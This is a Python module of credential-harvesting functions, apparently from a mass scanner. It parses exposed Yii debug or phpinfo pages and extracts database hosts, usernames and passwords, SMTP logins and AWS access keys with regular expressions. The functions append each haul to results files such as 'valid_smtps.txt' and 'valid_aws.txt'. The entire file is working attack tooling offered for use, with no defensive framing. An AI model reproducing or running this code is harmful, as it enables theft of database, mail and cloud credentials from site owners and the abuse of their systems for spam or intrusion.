import re


def grabdatabase(page, star):
    global db_username, db_host, db_password, db_connection, db_port
    method = "/YII_DEBUG"
    try:
        if "MYSQL_USER" in page:
            try:
                db_username = re.findall('MYSQL_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_connection = re.findall('MYSQL_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_password = re.findall('MYSQL_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_port = re.findall('MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "MYSQL_USERNAME" in page:
            try:
                db_username = re.findall('MYSQL_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_connection = re.findall('MYSQL_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_password = re.findall('MYSQL_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_port = re.findall('MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "MYSQL_USERNAME_WEB" in page:
            try:
                db_username = re.findall('MYSQL_USERNAME_WEB </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_connection = re.findall('MYSQL_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "myql"
            try:
                db_password = re.findall('MYSQL_PASSWORD_WEB </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_port = re.findall('MYSQL_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('MYSQL_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "DB_USER" in page:
            try:
                db_username = re.findall('DB_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_password = re.findall('DB_PASS </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_connection = re.findall('DB_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_port = re.findall('DB_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('DB_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "DB_USERNAME" in page:
            try:
                db_username = re.findall('DB_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_password = re.findall('DB_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_connection = re.findall('DB_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_port = re.findall('DB_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('DB_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "DATABASE_USERNAME" in page:
            try:
                db_username = re.findall('DATABASE_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_password = re.findall('DATABASE_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_connection = re.findall('DATABASE_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_port = re.findall('DATABASE_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('DATABASE_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "DATABASE_USERNAME" in page:
            try:
                db_username = re.findall('DATABASE_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_password = re.findall('DATABASE_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_connection = re.findall('DATABASE_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_port = re.findall('DATABASE_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('DATABASE_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if "DB_OLD_USERNAME" in page:
            try:
                db_username = re.findall('DB_OLD_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_username = ""
            try:
                db_password = re.findall('DB_OLD_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_password = ""
            try:
                db_connection = re.findall('DB_OLD_CONNECTION </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                db_connection = "mysql"
            try:
                db_port = re.findall('DB_OLD_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if db_port == "null":
                    db_port = "3306"
                else:
                    db_port = db_port
            except:
                db_port = "3306"
            try:
                db_host = re.findall('DB_OLD_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
                if "." in db_host:
                    db_host = db_host
                else:
                    db_host = star.replace("https://", "").replace("http://", "").replace(":443", "").replace(":80", "")
            except:
                db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
        if db_host == "localhost" or db_host == "127.0.0.1":
            db_host = star.replace("http://", "") or star.replace("https://", "")
            if ":" in db_host:
                db_host = db_host.split(":")[0]
        build = 'URL: ' + str(star) + '\nMETHOD: ' + "/YII_CONFIG" + '\nDB_HOST: ' + str(
            db_host) + '\nDB_CONNECTION: ' + str(
            db_connection) + '\nDB_PORT: ' + str(
            db_port) + '\nDB_USERNAME: ' + str(
            db_username) + '\nDB_PASSWORD: ' + str(db_password) + "\n"
        remover = build.replace('\r', '')
        databases = open("Results/database.txt", "a")
        databases.write(remover + '\n')
        databases.close()
        db_database = db_username
        url = star
        return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
    except Exception as e:
        return False


def smtps(page, url):
    global smtp_host, smtp_port, smtp_username, smtp_password
    method = "/Yii_Debug"
    smtp_from = ""
    smtp_name = ""
    try:
        if "SMTP_USERNAME" in page:
            try:
                smtp_username = re.findall('SMTP_USERNAME </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_username = ""
            try:
                smtp_password = re.findall('SMTP_PASSWORD </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_password = ""
            try:
                smtp_port = re.findall('SMTP_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_port = "587"
            try:
                smtp_host = re.findall('SMTP_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_host = ""
        elif "SMTP_USER " in page:
            try:
                smtp_username = re.findall('SMTP_USER </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_username = ""
            try:
                smtp_password = re.findall('SMTP_PASS </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_password = ""
            try:
                smtp_port = re.findall('SMTP_PORT </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_port = "587"
            try:
                smtp_host = re.findall('SMTP_HOST </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                smtp_host = ""
        if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' or smtp_username == '""' or smtp_password == '""':
            return False
        else:
            build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                smtp_from) + '\nFROMNAME: ' + str(smtp_name)
            remover = str(build).replace('\r', '')
            smtps = open('Results/valid_smtps.txt', 'a')
            smtps.write(remover + '\n\n')
            smtps.close()
            return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from, smtp_name
    except:
        return False


def Yii_AWS(page):
    try:
        if "AWS" in page:
            try:
                aws_id = re.findall('AWS_ID </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                aws_id = ''
            try:
                aws_secret = re.findall('AWS_SECRET </td><td class="v">(.*?) </td></tr>\n', page)[0]
            except:
                aws_secret = ''
            aws_default_region = "us-east-2"
            if aws_id == '' or aws_secret == '':
                pass
            else:
                seh = aws_id + "|" + aws_secret + "|" + aws_default_region
                schrijven = open("Results/valid_aws.txt", "a")
                schrijven.write(seh + "\n")
                schrijven.close()
                return aws_id, aws_secret, aws_default_region
    except:
        return False
